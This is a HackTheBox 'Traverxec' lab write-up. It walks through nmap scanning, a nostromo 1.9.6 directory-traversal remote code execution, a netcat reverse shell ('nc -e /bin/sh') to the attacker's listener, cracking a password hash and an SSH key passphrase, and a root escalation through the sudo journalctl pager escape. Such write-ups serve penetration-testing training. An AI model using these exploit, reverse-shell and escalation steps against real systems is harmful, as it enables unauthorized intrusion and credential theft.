## nmap
scan ip with nmap
```
shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec/nmap$ nmap -sC -sV -oA traverxec 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:28 UTC
Nmap scan report for 10.10.10.165
Host is up (0.041s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
```

## searchsploit
nostromo looked interesting, so I did a searchsploit search for anything matching that string.  Saw that a couple directory traversal exploits came back.  Based on the name of the box, I assume traversal is the path in through the app.  

```
shotop@kali:~/Pentesting/HackTheBox$ searchsploit nostromo
-------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                        |  Path
                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                  | exploits/multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                  | exploits/linux/remote/35466.sh
-------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

## exploit
code for the metasploit module is here:
https://www.exploit-db.com/exploits/47573

I won't use metasploit itself, so I examine the exploit, seeing how it works and what strings it appends to the url. Turns out it sends an api post request and data param is where the command gets executed.  Just throwing the traversal string on the end of the url in the browser also starts showing you the directory structure of the box. 
```
def execute_command(cmd, opts = {})
    send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),
      'headers' => {'Content-Length:' => '1'},
      'data'    => "echo\necho\n#{cmd} 2>&1"
      }
    )
  end
```

Messed around with the metasploit exploit above for a bit, but was having trouble with the CGI encoding using curl.  Looked around for a version specific exploit and found this: https://packetstormsecurity.com/files/155802/nostromo-1.9.6-Remote-Code-Execution.html

Copied that code into a file locally and ran it with good results:
```
shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec$ python exploit.py 10.10.10.165 80 whoami

HTTP/1.1 200 OK
Date: Sat, 04 Jan 2020 21:29:39 GMT
Server: nostromo 1.9.6
Connection: close


www-data

```

## foothold
figiured out a netcat command to get a reverse shell on the attacking machine:
- on attacking machine run `nc -nlvp 8081`
- using python command exploit above, pass the following command to call back to the listener (i.e. send off the reverse shell) 
```
shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec$ python exploit.py 10.10.10.165 80 'nc -e /bin/sh my_local_ip 8081'
```

shell connects:
```
shotop@kali:~/Downloads$ nc -nlvp 8081
listening on [any] 8081 ...
connect to 
whoami
www-data
```

stabalize shell:
```
Stabalized reverse shell:
on victim
python -c "import pty; pty.spawn('/bin/bash')"

ctrl-z to jump back to local

on local: 
stty raw -echo
fg

back on victim:
export TERM=xterm
```

## Enumeration on the box
environment variables point to config files for the web server
```
www-data@traverxec:/var/nostromo/conf$ env
SERVER_NAME=traverxec.htb
SCRIPT_NAME=/../../../../bin/sh
GATEWAY_INTERFACE=CGI/1.1
SERVER_SOFTWARE=nostromo 1.9.6
DOCUMENT_ROOT=/var/nostromo/htdocs
PWD=/var/nostromo/conf
REQUEST_URI=/../../../../bin/sh
SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
REMOTE_PORT=54407
TERM=xterm
SERVER_ADMIN=david@traverxec.htb
SERVER_ADDR=127.0.1.1
SHLVL=1
CONTENT_LENGTH=1
SERVER_PROTOCOL=HTTP/1.1
SERVER_PORT=80
SCRIPT_FILENAME=/var/nostromo/htdocs/../../../../bin/sh
REMOTE_ADDR=10.10.14.31
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
REQUEST_METHOD=POST
_=/usr/bin/env
OLDPWD=/var/nostromo
```
nhttpd.conf points to password files for the david user:
```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
David's password hash - going to pass to hashcat:
```
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
cracked:
```
shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec/hashes$ cat cracked.txt 
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```
the conf file above points toward a public home directory:
```
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
```

the protected-file-area directory has a .tgz file in it.  I unzipped it to the /tmp directory since I was getting permission errors trying to unzip it to the david/home dir. 

```
www-data@traverxec:/tmp/home/david$ ls -la
total 12
drwxr-xr-x 3 www-data www-data 4096 Jan  5 22:34 .
drwxr-xr-x 3 www-data www-data 4096 Jan  5 22:34 ..
drwx------ 2 www-data www-data 4096 Oct 25 17:02 .ssh
```

In the extracted .ssh directory, there are public and private ssh keys.  I copied the private `id_rsa` key over to my local kali and used john the ripper to crack it's passphrase:

```
shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

shotop@kali:~/Pentesting/HackTheBox/Boxes/traverxec$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2020-01-05 22:19) 0.4504g/s 6460Kp/s 6460Kc/s 6460KC/sa6_123..*7¡Vamos!
Session completed
```

## user privilege escalation 
Back on the traverxec box, I ssh into the server using the passphrase decrypted above with private key I found - as user david:

```
www-data@traverxec:/tmp/home/david/.ssh$ ssh -i id_rsa david@traverxec.htb
Could not create directory '/var/www/.ssh'.
The authenticity of host 'traverxec.htb (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ 
david@traverxec:~$ whoami
david
david@traverxec:~$ 
```

user flag was in the home directory:
```
david@traverxec:~$ cd /home/
david@traverxec:/home$ ls
david
david@traverxec:/home$ cd david/
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt 
7db0b48469606a42cec20750d9782f3d
```

## root privilege escalation

in davids home directory there is a folder called bin with a .sh file in it.  I catted that file to see what it does:
```
# cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```
^ the last line is key.  The script for some reason (i dont know why) can run sudo followed by journal ctl to basically spit out the last 5 lines of unostromo service logs.  Up until now I've been asked for a password everytime I attempted sudo.  Not this time:

```
# /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2020-01-04 21:35:18 EST, end at Mon 2020-01-06 00:31:04 EST
Jan 05 16:57:27 traverxec su[1568]: pam_unix(su:auth): authentication failure; l
Jan 05 16:57:29 traverxec su[1568]: FAILED SU (to david) www-data on pts/0
Jan 05 18:35:21 traverxec sudo[1683]: pam_unix(sudo:auth): authentication failur
Jan 05 23:22:06 traverxec su[1879]: pam_unix(su:auth): authentication failure; l
Jan 05 23:22:08 traverxec su[1879]: FAILED SU (to david) www-data on pts/1
```

I jump into gtfobins and do a search on journalctl as a potential path to a sudo shell:
https://gtfobins.github.io/gtfobins/journalctl/

Turns out it can be used this way - also TIL it defaults to the less pager

So once you run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`, you are effectively in the less pager.  Reading through its man page, we see that you can use `!` followed by a shell path to drop directly into a new shell.  Since less was opened by sudo, it drops us into a root shell:  

```
david@traverxec:~/bin$                                                          
-- Logs begin at Sat 2020-01-04 21:35:18 EST, end at Mon 2020-01-06 00:34:47 EST 
Jan 05 16:57:27 traverxec su[1568]: pam_unix(su:auth): authentication failure; l
Jan 05 16:57:29 traverxec su[1568]: FAILED SU (to david) www-data on pts/0
Jan 05 18:35:21 traverxec sudo[1683]: pam_unix(sudo:auth): authentication failur
Jan 05 23:22:06 traverxec su[1879]: pam_unix(su:auth): authentication failure; l
Jan 05 23:22:08 traverxec su[1879]: FAILED SU (to david) www-data on pts/1
!/usr/bin/sh
# whoami
root
```
root hash was easy to find after that:
```
# whoami
root
# cd /root
# ls
nostromo_1.9.6-1.deb  root.txt
# cat root.txt
9aa36a6d76f785dfd320a478f6e....
```
